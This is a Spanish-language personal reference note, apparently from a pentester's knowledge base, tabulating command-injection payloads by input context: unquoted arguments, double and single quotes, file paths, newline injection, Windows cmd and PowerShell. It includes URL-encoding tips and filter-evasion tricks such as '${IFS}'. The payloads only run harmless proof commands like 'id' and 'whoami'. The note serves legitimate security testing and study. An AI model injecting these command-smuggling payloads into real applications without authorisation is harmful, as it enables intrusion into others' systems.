---
tipo: meta
aliases:
  - Contextos command injection
  - Rupturas de contexto
tags:
  - meta/referencia
  - dominio/web
---

# Command injection contextos - matriz de referencia

> [!info] Referencia pura, no un zettel
> Cómo **romper** según dónde cae el input dentro del comando. El criterio de qué canal usar después vive en [[MOC - Command injection]]. Los separadores por shell, en [[Command injection shells - matriz de referencia]]. `yi``  ` copia el payload.

## 0. Detectar el punto de inyección

Se prueba un carácter por vez y se observa el cambio. Lo que se busca no es la salida del comando inyectado: es **cualquier** diferencia respecto de la respuesta base.

`;`  `&`  `|`  `&&`  `||`  `` ` ``  `$( )`  `\n`
Los ocho candidatos. Si alguno cambia la respuesta o el código de estado, hay parser de shell detrás.

`x' ; id ; echo 'x`
`x" ; id ; echo "x`
Prueba de las dos comillas de una: si la app comilla el argumento, uno de los dos cierra bien y el comando queda balanceado.

> [!warning] Codificar en la URL, siempre
> `&` corta el query string y `#` corta la URL entera. Sin codificar, el payload nunca llega al servidor: parece que no hay vulnerabilidad y en realidad no se probó nada.
>
> `;` → `%3b` · `&` → `%26` · `|` → `%7c` · `` ` `` → `%60` · `\n` → `%0a` · `#` → `%23` · espacio → `%20`

## 1. Argumento suelto, sin comillas

El caso más simple: `ping <input>`. Todo separador funciona directo.

`127.0.0.1; id`
Secuencial. Ejecuta el segundo comando pase lo que pase con el primero.

`127.0.0.1 && id`
Solo si el primero termina bien. Útil para confirmar que el primer comando corre.

`127.0.0.1 || id`
Solo si el primero **falla**. La opción cuando el valor legítimo es inválido a propósito.

`127.0.0.1 | id`
Pipe. Descarta la salida del primero, lo que **limpia la respuesta** y deja solo lo inyectado.

`127.0.0.1 & id`
En Unix manda el primero al fondo. En Windows `cmd` es el separador secuencial normal.

## 2. Dentro de comillas dobles

`ping "<input>"`. Las comillas dobles **no** desactivan la sustitución de comandos: no hace falta cerrarlas.

`127.0.0.1$(id)`
`127.0.0.1`id``
Ambos ejecutan sin tocar las comillas. Es el caso donde una app "protegida" por comillar sigue cayendo.

`127.0.0.1"; id; echo "`
Cerrar y reabrir, para separadores que sí necesitan salir del contexto.

`127.0.0.1${IFS}&&${IFS}id`
Cuando además los espacios están filtrados — ver [[Command injection evasión - matriz de referencia]].

## 3. Dentro de comillas simples

`ping '<input>'`. Las comillas simples desactivan **toda** interpretación: no hay sustitución posible sin cerrarlas primero.

`127.0.0.1'; id; echo '`
Única vía. Si la comilla simple está filtrada o escapada, este contexto es un muro y el camino pasa a ser [[Argument injection - abuso de flags]].

## 4. Dentro de una ruta

`cat /var/data/<input>.txt`. El input está enterrado entre un prefijo y un sufijo.

`x; id; echo x`
El sufijo `.txt` queda pegado al último `echo` y no molesta.

`x$(id)x`
Sin separadores, si están filtrados.

`x; id #`
Comentario para descartar el sufijo. `#` va codificado como `%23` o nunca llega.

## 5. Nueva línea

Frecuente cuando el input va a un archivo de configuración o a un script generado, y en campos que el filtro de la app trata como una sola línea.

`127.0.0.1%0aid`
El salto de línea es un separador de comandos tan válido como `;`, y muchísimos filtros no lo contemplan.

## 6. Windows

`127.0.0.1 & whoami`
`cmd`: separador secuencial. `&&` y `||` funcionan igual que en Unix.

`127.0.0.1; whoami`
PowerShell: `;` es el separador. `&` **no** lo es — ahí es el operador de invocación.

`127.0.0.1 | whoami`
Pipe en ambos, aunque en PowerShell pasa objetos y no texto.

> [!tip] `%0a` no sirve en `cmd`
> A diferencia de Unix, `cmd.exe` no toma el salto de línea como separador en una línea de comando ya construida. En PowerShell sí funciona.

## 7. Sin ruptura posible

Si ningún separador ni sustitución produce efecto pero el argumento sí llega al binario, no es que no haya vulnerabilidad: es que no hay shell. El dominio cambia a [[Argument injection - abuso de flags]] y la matriz a consultar es [[Argument injection - matriz de referencia]].

Señal típica: los metacaracteres aparecen **literales** en un mensaje de error, o el binario se queja de que el argumento no existe con los caracteres incluidos.
